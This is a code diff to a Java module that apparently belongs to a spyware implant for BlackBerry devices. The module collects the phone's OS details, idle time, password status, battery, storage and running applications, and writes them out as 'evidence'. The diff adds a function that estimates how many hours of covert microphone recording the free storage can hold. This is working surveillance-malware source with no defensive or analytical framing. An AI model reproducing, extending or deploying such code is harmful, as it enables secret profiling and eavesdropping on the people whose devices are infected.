@@ -80,7 +80,6 @@ public final class ModuleDevice extends BaseInstantModule {
         sb.append("-- OS --\r\n");
         sb.append("Platform: " + DeviceInfo.getPlatformVersion() + "\n");
         sb.append("OS: " + DeviceInfo.getSoftwareVersion() + "\n");
-
         sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
         sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
         sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
@@ -127,6 +126,28 @@ public final class ModuleDevice extends BaseInstantModule {
 
         }
 
+        sb.append("-- FLASH --\r\n");        
+        long freeSpace = Path.freeSpace(Path.USER);
+        long totalSpace = DeviceInfo.getTotalFlashSize();
+        
+        if(totalSpace>freeSpace){
+            sb.append("Internal Size: "
+                    + (int) (DeviceInfo.getTotalFlashSize() / (1024 * 1024))
+                    + " MB\n");
+        }
+        
+        if (freeSpace != -1) {
+            sb.append("Free internal: "
+                    + (int) (freeSpace / (1024 * 1024))
+                    + " MB\n");
+            sb.append("MIC recording time: " + micRecTime(freeSpace) + " hours\n");
+        }
+
+        if (Path.isSDAvailable()) {
+            sb.append("SD size: " + Path.totalSpace(Path.SD) + " Bytes\n");
+            sb.append("Free SD: " + Path.freeSpace(Path.SD) + " Bytes\n");
+        }
+        
         // Alimentazione
         sb.append("-- POWER --\r\n");
         sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
@@ -183,21 +204,7 @@ public final class ModuleDevice extends BaseInstantModule {
             //#endif
         }
 
-        sb.append("-- FLASH --\r\n");
-        sb.append("Internal Size: "
-                + (int) (DeviceInfo.getTotalFlashSize() / (1024 * 1024))
-                + " MB\n");
-        long freeSpace = Path.freeSpace(Path.USER);
-        if (freeSpace != -1) {
-            sb.append("Free internal: "
-                    + (int) (Path.freeSpace(Path.USER) / (1024 * 1024))
-                    + " MB\n");
-        }
 
-        if (Path.isSDAvailable()) {
-            sb.append("SD size: " + Path.totalSpace(Path.SD) + " Bytes\n");
-            sb.append("Free SD: " + Path.freeSpace(Path.SD) + " Bytes\n");
-        }
 
         sb.append("-- APPLICATIONS --\r\n");
         sb.append(getRunningApplications());
@@ -217,6 +224,15 @@ public final class ModuleDevice extends BaseInstantModule {
         Evidence evidence = new Evidence(EvidenceType.DEVICE);
         evidence.atomicWriteOnce(sb.toString());
 
+    }
+
+    private int micRecTime(long freeSpace) {
+        // 8192 bytes every 5 seconds.
+        // 1638 bytes every second
+        // 98304 b / min
+        // 5898240 b / hour
+                
+        return (int)(freeSpace/5898240);
     }
 
     /**
